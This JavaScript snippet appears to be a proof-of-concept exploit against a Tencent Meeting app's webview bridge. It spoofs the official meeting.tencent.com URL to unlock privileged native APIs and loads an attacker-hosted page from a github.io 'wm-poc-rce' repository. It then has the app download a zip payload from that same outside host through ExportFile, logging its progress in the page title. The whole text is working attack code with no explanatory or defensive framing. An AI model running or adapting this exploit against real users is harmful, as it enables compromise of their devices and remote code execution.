(function(){
  document.title='P91TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P91CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P91TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P91TB-NOMGR:'+location.host;return}
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  var atk='https://gitwhs.github.io/wm-poc-rce/p91tpl.html';
  var zip='https://gitwhs.github.io/wm-poc-rce/p50.zip';
  var apis=['ExportFile','DownloadIdeaFile','LoadUrl','LoadTemplateWebView','SetOpenJsApiConfig','LoadUrlByTemplate','ExecuteTemplateLoadUrl','EvaluateJavascript','execute_js_script'];
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['C1','CommonPlugin','CheckJsApiConfig',{}],
    ['JC','CommonPlugin','JsApiConfig',{url:official,jsApiList:apis}],
    ['SC','CommonPlugin','SetOpenJsApiConfig',{url:official,jsApiList:apis,open:true}],
    ['T1','CommonPlugin','LoadTemplateWebView',{url:official,template_url:official,template_id:'p91',process_pattern:0}],
    ['LU','CommonPlugin','LoadUrlByTemplate',{url:atk,template_url:official}],
    ['L2','CommonPlugin','ExecuteTemplateLoadUrl',{url:atk,template_url:official}],
    ['EX','CommonPlugin','ExportFile',{fileName:'p91.bin',contentType:'application/octet-stream',url:zip}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P91TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P91-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 3500);
  }
  setTimeout(n, 800);
})();
